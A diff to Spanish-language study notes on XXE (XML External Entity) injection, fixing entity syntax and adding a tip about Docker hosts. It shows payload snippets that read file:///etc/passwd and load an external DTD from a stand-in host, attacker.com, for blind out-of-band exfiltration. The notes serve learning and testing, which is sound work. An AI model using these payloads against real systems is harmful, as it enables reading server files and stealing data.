@@ -18,9 +18,9 @@
 - XML es mas flexible que HTML en el sentido de que se pueden crear entidades personalizadas
 ```
 <!DOCTYPE foo [<!ENTITY myName "savitar">]>
-&myName # de esta forma hacemos referencia a la misma
+&myName; # de esta forma hacemos referencia a la misma
 ```
-- `&myName` puede contener `SYSTEM 'file:///etc/passwd'` que es un comando que corre el servidor para mostrar el archivo `/etc/passwd`
+- `&myName;` puede contener `SYSTEM 'file:///etc/passwd'` que es un comando que corre el servidor para mostrar el archivo `/etc/passwd`
 
 ## XXE OOB - Fuera de banda
 > En el caso de los XXE fuera de banda (también llamados XXE ciegos), **no hay una respuesta inmediata de la aplicación web**. El proceso para explotar vulnerabilidades XXE fuera de banda es similar al uso de entidades de parámetros con XXE en banda e implica la creación de una **DTD (Definición de Tipo de Documento)** externa. Existe una diferencia importante: con este tipo de ataque, el atacante necesita que el analizador XML realice una solicitud adicional a un servidor controlado por el atacante. Esto es necesario para leer el contenido del archivo local.
@@ -43,7 +43,7 @@ POST http://example.com/xml HTTP/1.1
 ### Caso blind
 - Hay veces que no puedes declarar entidades nuevas en el XML
 `<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd"> %dtd; ]>`
-
+- El `attacker.com` es claramente la ip de tu maquina, si usas docker podes probar `host.docker.internal`.
 ## Wrappers
 - Existen diferentes wrapper que sirven para representar datos de diferentes formas:
 `file://` - muestra la salida como esta originalmente
